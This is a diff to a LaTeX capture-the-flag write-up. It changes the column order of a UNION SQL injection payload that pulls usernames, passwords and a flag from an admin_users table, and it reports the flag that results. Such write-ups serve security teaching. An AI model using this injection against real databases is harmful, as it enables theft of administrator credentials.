@@ -1168,7 +1168,7 @@ The \texttt{reports} table has five columns. A UNION payload to extract
 credentials from the \texttt{admin\_users} table is:
 
 \begin{lstlisting}[caption={UNION SQLi payload to dump admin\_users}]
-' UNION SELECT 1,username,password,flag,5 FROM admin_users--
+' UNION SELECT 1,username,flag,password,5 FROM admin_users--
 \end{lstlisting}
 
 This returns \texttt{FLAG\{synapse\_sqli\_creds\_dumped\}} (FLAG~\#1).
